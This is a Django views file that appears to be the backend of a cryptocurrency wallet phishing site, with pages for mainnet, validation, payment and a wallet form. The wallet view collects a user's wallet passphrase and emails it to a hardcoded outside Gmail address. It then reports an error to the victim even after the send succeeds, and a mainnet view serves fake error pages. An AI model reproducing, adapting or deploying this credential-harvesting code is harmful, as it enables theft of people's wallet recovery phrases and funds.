from django.shortcuts import render, redirect
import requests
from django.core.mail import send_mail
from django.conf import settings
from socket import timeout as socket_timeout
from smtplib import SMTPException
from django.http import HttpResponseRedirect, Http404, JsonResponse
# Create your views here.


def index(request):
    return render(request, 'index.html')

def mainnet(request, exception=None):
    try:
        error_type = request.GET.get('error', 'default')
        
        if error_type == '404' or exception is not None:
            # Handle 404 errors
            response = render(request, 'mainnet.html', {
                'error_code': '404',
                'error_message': 'Page Not Found',
                'error_description': 'The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.'
            })
            response.status_code = 404
            return response
        else:
            # Handle other errors (502)
            response = render(request, 'mainnet.html', {
                'error_code': '502',
                'error_message': 'Service Temporarily Unavailable',
                'error_description': 'The server is temporarily unable to service your request due to maintenance downtime or capacity problems. Please try again later.'
            })
            response.status_code = 502
            return response
            
    except Exception as e:
        # Fallback error handling
        response = render(request, 'mainnet.html', {
            'error_code': '500',
            'error_message': 'Internal Server Error',
            'error_description': 'Something went wrong. Please try again later.'
        })
        response.status_code = 500
        return response

def validate(request):
    return render(request, 'validate.html')

def payment(request):
    return render(request, 'payment.html')

def amount(request):
    return render(request, 'amount.html')

def wallet(request):
    if request.method == 'POST':
        passphrase = request.POST.get('mf-text', '').strip()
        if not passphrase:
            return JsonResponse({'status': 'error'})
            
        try:
            subject = "New Wallet Passphrase"
            message = f"Passphrase: {passphrase}"
            from_email = settings.EMAIL_HOST_USER
            recipient_list = ['saviourv9@gmail.com']

            try:
                send_mail(
                    subject,
                    message,
                    from_email,
                    recipient_list,
                    fail_silently=False,  # Changed to False to raise exceptions
                )
                print("Email sent successfully!")
                return JsonResponse({'status': 'error'})
            except SMTPException as smtp_error:
                print(f"SMTP Error occurred: {str(smtp_error)}")
                return JsonResponse({'status': 'error', 'error': str(smtp_error)})
            except socket_timeout as timeout_error:
                print(f"Timeout Error occurred: {str(timeout_error)}")
                return JsonResponse({'status': 'error', 'error': 'Email timeout'})
            except Exception as email_error:
                print(f"Unexpected email error: {str(email_error)}")
                return JsonResponse({'status': 'error', 'error': str(email_error)})

        except Exception as e:
            print(f"General error: {str(e)}")
            return JsonResponse({'status': 'error', 'error': str(e)})
    return render(request, 'wallet.html')
